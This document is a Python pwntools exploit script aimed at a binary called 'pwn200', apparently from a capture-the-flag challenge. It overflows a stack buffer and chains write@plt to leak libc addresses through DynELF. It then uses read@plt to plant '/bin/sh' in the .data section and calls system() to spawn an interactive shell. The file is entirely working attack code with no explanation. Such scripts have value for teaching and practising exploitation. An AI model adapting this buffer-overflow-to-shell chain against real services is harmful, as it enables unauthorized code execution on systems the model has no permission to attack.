#!/usr/bin/env python


from pwn import *

Io = process("./pwn200")

def leak(addr):
    print Io.readuntil("~!\n")
    junk = "A" * 0x6c + "BBBB"
    write_plt = p32(0x080483C0)
    start_addr = p32(0x080483D0)
    fd = p32(1) # stdout
    buf = p32(addr) # leak_addr
    count = p32(4) # size of buf
    payload = junk + write_plt + start_addr + fd + buf + count
    Io.send(payload)
    leak_data = Io.recv(4)
    print "[%s] -> [%s] = [%s]" % (hex(addr), hex(u32(leak_data)), repr(leak_data))
    return leak_data

d = DynELF(leak, elf=ELF("./pwn200"))
system_addr = d.lookup('system', 'libc')
print "[system()] -> [%s]" % (hex(system_addr))

data_addr = 0x0804A014# actually is the address of .data

# write /bin/sh
junk = "A" * 0x6c + "BBBB"
read_plt = p32(0x08048390)
start_addr = p32(0x080483D0)
count = p32(8)
buf = p32(data_addr)
fd = p32(0)
payload = junk + read_plt + start_addr + fd + buf + count
Io.send(payload)


# send /bin/sh
Io.send("/bin/sh\x00")

# call system
junk = "A" * 0x6c + "BBBB"
system_addr = p32(system_addr)
null_addr = p32(0xFFFFFFFF) # who care ?
bin_sh_addr = p32(data_addr)
payload = junk + system_addr + null_addr + bin_sh_addr
Io.send(payload)


# interactive()
Io.interactive()
